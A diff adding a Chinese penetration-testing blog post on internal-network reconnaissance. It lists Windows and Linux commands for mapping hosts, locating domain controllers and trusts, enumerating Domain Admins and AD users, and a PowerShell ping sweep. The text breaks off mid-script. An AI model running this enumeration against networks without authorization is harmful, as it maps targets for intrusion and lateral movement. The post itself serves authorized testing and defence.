@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="系统化梳理内网渗透信息收集技术，涵盖网络配置、域环境、WMI&#x2F;PowerShell脚本与BloodHound数据采集，附完整检查清单与流程图。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网信息收集方法论">
+<meta property="og:url" content="https://congliang.github.io/Intranet-information-gathering/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="系统化梳理内网渗透信息收集技术，涵盖网络配置、域环境、WMI&#x2F;PowerShell脚本与BloodHound数据采集，附完整检查清单与流程图。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-02-05T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.902Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="信息收集">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/Intranet-information-gathering/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/Intranet-information-gathering/","path":"Intranet-information-gathering/","title":"内网信息收集方法论"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>内网信息收集方法论 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%BC%95%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">一、引言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">二、网络基础信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-IP-%E9%85%8D%E7%BD%AE%E4%B8%8E%E8%B7%AF%E7%94%B1"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 IP 配置与路由</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-ARP-%E7%BC%93%E5%AD%98%E4%B8%8E%E4%BC%9A%E8%AF%9D%E5%8F%91%E7%8E%B0"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 ARP 缓存与会话发现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E4%B8%8E%E4%BC%9A%E8%AF%9D"><span class="nav-number">2.3.</span> <span class="nav-text">2.3 网络连接与会话</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81DNS-%E4%B8%8E-DHCP-%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="nav-number">3.</span> <span class="nav-text">三、DNS 与 DHCP 服务发现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-DNS-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">3.1.</span> <span class="nav-text">3.1 DNS 信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-DHCP-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%9A%E4%BD%8D"><span class="nav-number">3.2.</span> <span class="nav-text">3.2 DHCP 服务器定位</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">4.</span> <span class="nav-text">四、域环境信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-%E5%9F%9F%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF"><span class="nav-number">4.1.</span> <span class="nav-text">4.1 域基础信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-%E5%9F%9F%E7%94%A8%E6%88%B7%E4%B8%8E%E7%BB%84%E6%9E%9A%E4%B8%BE"><span class="nav-number">4.2.</span> <span class="nav-text">4.2 域用户与组枚举</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-AD-%E6%B7%B1%E5%BA%A6%E6%9F%A5%E8%AF%A2"><span class="nav-number">4.3.</span> <span class="nav-text">4.3 AD 深度查询</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81WMI-CMD-PowerShell-%E6%94%B6%E9%9B%86%E8%84%9A%E6%9C%AC"><span class="nav-number">5.</span> <span class="nav-text">五、WMI &#x2F; CMD &#x2F; PowerShell 收集脚本</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-WMI-%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF"><span class="nav-number">5.1.</span> <span class="nav-text">5.1 WMI 系统信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-%E7%BB%BC%E5%90%88-PowerShell-%E8%84%9A%E6%9C%AC"><span class="nav-number">5.2.</span> <span class="nav-text">5.2 综合 PowerShell 脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3-CMD-%E5%85%BC%E5%AE%B9%E7%89%88%E6%9C%AC%EF%BC%88%E5%8F%97%E9%99%90%E7%8E%AF%E5%A2%83%EF%BC%89"><span class="nav-number">5.3.</span> <span class="nav-text">5.3 CMD 兼容版本（受限环境）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81BloodHound-%E6%95%B0%E6%8D%AE%E9%87%87%E9%9B%86%E4%B8%8E%E5%88%86%E6%9E%90"><span class="nav-number">6.</span> <span class="nav-text">六、BloodHound 数据采集与分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#6-1-SharpHound-%E9%87%87%E9%9B%86"><span class="nav-number">6.1.</span> <span class="nav-text">6.1 SharpHound 采集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-2-%E7%8E%AF%E5%A2%83%E5%90%AF%E5%8A%A8"><span class="nav-number">6.2.</span> <span class="nav-text">6.2 环境启动</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-3-%E6%A0%B8%E5%BF%83-Cypher-%E6%9F%A5%E8%AF%A2"><span class="nav-number">6.3.</span> <span class="nav-text">6.3 核心 Cypher 查询</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-4-SharpHound-%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="nav-number">6.4.</span> <span class="nav-text">6.4 SharpHound 注意事项</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%B5%81%E7%A8%8B%E5%9B%BE"><span class="nav-number">7.</span> <span class="nav-text">七、信息收集流程图</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%E3%80%81%E5%AE%8C%E6%95%B4%E6%A3%80%E6%9F%A5%E6%B8%85%E5%8D%95"><span class="nav-number">8.</span> <span class="nav-text">八、完整检查清单</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E5%B1%82%E9%9D%A2"><span class="nav-number">8.1.</span> <span class="nav-text">主机层面</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E5%B1%82%E9%9D%A2"><span class="nav-number">8.2.</span> <span class="nav-text">域层面</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B7%B1%E5%BA%A6%E6%9E%9A%E4%B8%BE%E4%B8%8E%E5%87%AD%E6%8D%AE%E6%94%B6%E9%9B%86"><span class="nav-number">8.3.</span> <span class="nav-text">深度枚举与凭据收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81%E8%AF%86%E5%88%AB"><span class="nav-number">8.4.</span> <span class="nav-text">安全产品识别</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B9%9D%E3%80%81%E6%80%BB%E7%BB%93"><span class="nav-number">9.</span> <span class="nav-text">九、总结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Intranet-information-gathering/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="内网信息收集方法论 | 渗透测试实战记录">
+      <meta itemprop="description" content="系统化梳理内网渗透信息收集技术，涵盖网络配置、域环境、WMI&#x2F;PowerShell脚本与BloodHound数据采集，附完整检查清单与流程图。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          内网信息收集方法论
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-02-05 08:00:00" itemprop="dateCreated datePublished" datetime="2025-02-05T08:00:00+08:00">2025-02-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">系统化梳理内网渗透信息收集技术，涵盖网络配置、域环境、WMI/PowerShell脚本与BloodHound数据采集，附完整检查清单与流程图。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="一、引言"><a href="#一、引言" class="headerlink" title="一、引言"></a>一、引言</h2><p>内网渗透的成败往往取决于信息收集的深度与广度。攻击者获得初始立足点后，必须迅速绘制目标网络拓扑、识别关键资产、定位域控制器并评估横向移动路径。本文系统化梳理核心技术与工具，提供可落地的脚本与完整检查清单。</p>
+<blockquote>
+<p><strong>声明：</strong> 本文所述技术仅供安全研究、授权渗透测试及防守方蓝队建设使用。未经授权对他人系统进行信息收集或渗透测试属于违法行为。</p>
+</blockquote>
+<h2 id="二、网络基础信息收集"><a href="#二、网络基础信息收集" class="headerlink" title="二、网络基础信息收集"></a>二、网络基础信息收集</h2><h3 id="2-1-IP-配置与路由"><a href="#2-1-IP-配置与路由" class="headerlink" title="2.1 IP 配置与路由"></a>2.1 IP 配置与路由</h3><p>获取主机 IP、子网掩码、网关及 DNS 服务器是绘制内网地图的第一步。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Windows</span></span><br><span class="line">ipconfig /all                  <span class="comment"># 完整IP配置（含DHCP服务器、DNS后缀）</span></span><br><span class="line">ipconfig /displaydns           <span class="comment"># DNS缓存，可能泄露内部域名</span></span><br><span class="line">route print                    <span class="comment"># 路由表</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Linux</span></span><br><span class="line">ifconfig <span class="literal">-a</span>                    <span class="comment"># 所有网络接口</span></span><br><span class="line">ip addr show &amp;&amp; ip route show  <span class="comment"># 现代替代</span></span><br><span class="line">route <span class="literal">-n</span>                       <span class="comment"># 路由表</span></span><br></pre></td></tr></table></figure>
+
+<p>路由表揭示内网网段、VPN 子网及出口网关。</p>
+<h3 id="2-2-ARP-缓存与会话发现"><a href="#2-2-ARP-缓存与会话发现" class="headerlink" title="2.2 ARP 缓存与会话发现"></a>2.2 ARP 缓存与会话发现</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">arp <span class="literal">-a</span>                         <span class="comment"># Windows / Linux 通用，同网段主机发现</span></span><br><span class="line">netsh advfirewall show allprofiles  <span class="comment"># 防火墙策略</span></span><br><span class="line">netsh wlan show profiles            <span class="comment"># WiFi历史（笔记本场景）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 快速 Ping 扫描 C 段</span></span><br><span class="line"><span class="number">1</span>..<span class="number">254</span> | % &#123; <span class="variable">$ip</span>=<span class="string">&quot;192.168.1.<span class="variable">$_</span>&quot;</span>; <span class="keyword">if</span>(<span class="built_in">Test-Connection</span> <span class="variable">$ip</span> <span class="literal">-Count</span> <span class="number">1</span> <span class="literal">-Quiet</span>)&#123;<span class="built_in">Write-Host</span> <span class="string">&quot;[+] <span class="variable">$ip</span>&quot;</span>&#125; &#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-网络连接与会话"><a href="#2-3-网络连接与会话" class="headerlink" title="2.3 网络连接与会话"></a>2.3 网络连接与会话</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano                   <span class="comment"># Windows: 所有TCP/UDP连接及PID</span></span><br><span class="line">ss -tunap                      <span class="comment"># Linux 现代替代</span></span><br></pre></td></tr></table></figure>
+
+<p>重点关注 LISTENING 及 ESTABLISHED 连接。关键端口：445(SMB)、3389(RDP)、5985(WinRM)、1433(MSSQL)、3306(MySQL)、6379(Redis)。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net session                    <span class="comment"># 活动SMB会话 → 推断管理员维护的主机（高价值）</span></span><br><span class="line">schtasks /query /fo LIST /v    <span class="comment"># 计划任务</span></span><br><span class="line"><span class="built_in">sc</span> query state= all            <span class="comment"># 所有服务</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="三、DNS-与-DHCP-服务发现"><a href="#三、DNS-与-DHCP-服务发现" class="headerlink" title="三、DNS 与 DHCP 服务发现"></a>三、DNS 与 DHCP 服务发现</h2><h3 id="3-1-DNS-信息收集"><a href="#3-1-DNS-信息收集" class="headerlink" title="3.1 DNS 信息收集"></a>3.1 DNS 信息收集</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nslookup <span class="literal">-type</span>=all &lt;target&gt;</span><br><span class="line"><span class="built_in">Resolve-DnsName</span> &lt;target&gt; <span class="literal">-Type</span> A</span><br><span class="line"><span class="comment"># DNS缓存分析 — 提取本机曾访问域名</span></span><br><span class="line">ipconfig /displaydns | <span class="built_in">Select-String</span> <span class="string">&quot;Record Name&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Unique</span></span><br></pre></td></tr></table></figure>
+
+<p>DNS 区域传送漏洞检测：<code>nslookup</code> → <code>server &lt;DNS_IP&gt;</code> → <code>ls -d &lt;域名&gt;</code>，成功则严重信息泄露。</p>
+<h3 id="3-2-DHCP-服务器定位"><a href="#3-2-DHCP-服务器定位" class="headerlink" title="3.2 DHCP 服务器定位"></a>3.2 DHCP 服务器定位</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all | findstr /i <span class="string">&quot;DHCP Server&quot;</span></span><br><span class="line">netsh dhcp client show state</span><br></pre></td></tr></table></figure>
+
+<p>域环境中 DHCP 常与域控部署在一起，定位它等同于发现关键基础设施。</p>
+<h2 id="四、域环境信息收集"><a href="#四、域环境信息收集" class="headerlink" title="四、域环境信息收集"></a>四、域环境信息收集</h2><h3 id="4-1-域基础信息"><a href="#4-1-域基础信息" class="headerlink" title="4.1 域基础信息"></a>4.1 域基础信息</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">REM === 域归属确认 ===</span></span><br><span class="line"><span class="built_in">net</span> config workstation         # 工作站域/DNS域名</span><br><span class="line">systeminfo                     # 系统信息（域、补丁）</span><br><span class="line">whoami /all                    # 当前权限与特权</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">REM === 域控制器定位 ===</span></span><br><span class="line"><span class="built_in">set</span> logonserver                # 当前认证服务器</span><br><span class="line">nltest /dclist:&lt;DomainName&gt;    # 所有域控制器</span><br><span class="line">nltest /domain_trusts          # 信任关系（子域/父域/跨林 → 横向移动边界）</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-2-域用户与组枚举"><a href="#4-2-域用户与组枚举" class="headerlink" title="4.2 域用户与组枚举"></a>4.2 域用户与组枚举</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">REM === 用户 ===</span></span><br><span class="line"><span class="built_in">net</span> user /domain                       # 所有域用户</span><br><span class="line"><span class="built_in">net</span> user &lt;username&gt; /domain            # 指定用户详情</span><br><span class="line">wmic useraccount get name,sid,status   # WMI方式</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">REM === 关键组 ===</span></span><br><span class="line"><span class="built_in">net</span> group /domain                      # 域全局组</span><br><span class="line"><span class="built_in">net</span> group &quot;Domain Admins&quot; /domain      # DA组成员 — 最高价值目标</span><br><span class="line"><span class="built_in">net</span> group &quot;Enterprise Admins&quot; /domain  # 企业管理员</span><br><span class="line"><span class="built_in">net</span> group &quot;Domain Controllers&quot; /domain # 域控计算机</span><br><span class="line"><span class="built_in">net</span> group &quot;Domain Computers&quot; /domain   # 域内计算机</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">REM === 本地组（本机提权路径分析） ===</span></span><br><span class="line"><span class="built_in">net</span> localgroup Administrators          # 本机管理员</span><br><span class="line"><span class="built_in">net</span> localgroup &quot;Remote Desktop Users&quot;  # RDP用户</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-3-AD-深度查询"><a href="#4-3-AD-深度查询" class="headerlink" title="4.3 AD 深度查询"></a>4.3 AD 深度查询</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方式一：ActiveDirectory 模块（需 RSAT）</span></span><br><span class="line"><span class="built_in">Get-ADUser</span> <span class="literal">-Filter</span> * <span class="literal">-Properties</span> LastLogonDate,Enabled | <span class="built_in">Select</span> Name,SamAccountName</span><br><span class="line"><span class="built_in">Get-ADComputer</span> <span class="literal">-Filter</span> * <span class="literal">-Properties</span> OperatingSystem,LastLogonDate</span><br><span class="line"><span class="built_in">Get-ADGroup</span> <span class="literal">-Filter</span> * | <span class="built_in">Select</span> Name,GroupCategory,GroupScope</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方式二：ADSI（无需AD模块，通用性更强）</span></span><br><span class="line"><span class="variable">$s</span> = <span class="built_in">New-Object</span> DirectoryServices.DirectorySearcher([<span class="type">ADSI</span>]<span class="string">&quot;LDAP://DC=domain,DC=com&quot;</span>)</span><br><span class="line"><span class="variable">$s</span>.Filter = <span class="string">&quot;(&amp;(objectCategory=user)(objectClass=user))&quot;</span></span><br><span class="line"><span class="variable">$s</span>.PageSize = <span class="number">1000</span></span><br><span class="line"><span class="variable">$s</span>.FindAll() | % &#123; <span class="variable">$_</span>.Properties[<span class="string">&#x27;samaccountname&#x27;</span>] &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="五、WMI-CMD-PowerShell-收集脚本"><a href="#五、WMI-CMD-PowerShell-收集脚本" class="headerlink" title="五、WMI &#x2F; CMD &#x2F; PowerShell 收集脚本"></a>五、WMI &#x2F; CMD &#x2F; PowerShell 收集脚本</h2><h3 id="5-1-WMI-系统信息"><a href="#5-1-WMI-系统信息" class="headerlink" title="5.1 WMI 系统信息"></a>5.1 WMI 系统信息</h3><p>WMI 默认运行且日志较少，是内网信息收集利器。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wmic os get Caption,Version,OSArchitecture,LastBootUpTime,TotalVisibleMemorySize /format:list</span><br><span class="line">wmic <span class="keyword">process</span> get Name,ProcessId,ExecutablePath,CommandLine /format:csv  <span class="comment"># 进程+命令行</span></span><br><span class="line">wmic product get Name,Version,Vendor /format:csv                        <span class="comment"># 已安装软件</span></span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn                   <span class="comment"># 补丁（提权分析）</span></span><br><span class="line">wmic startup get Caption,Command,Location,User                          <span class="comment"># 启动项</span></span><br><span class="line">wmic share get Name,Path,Description                                    <span class="comment"># 共享文件夹</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-2-综合-PowerShell-脚本"><a href="#5-2-综合-PowerShell-脚本" class="headerlink" title="5.2 综合 PowerShell 脚本"></a>5.2 综合 PowerShell 脚本</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 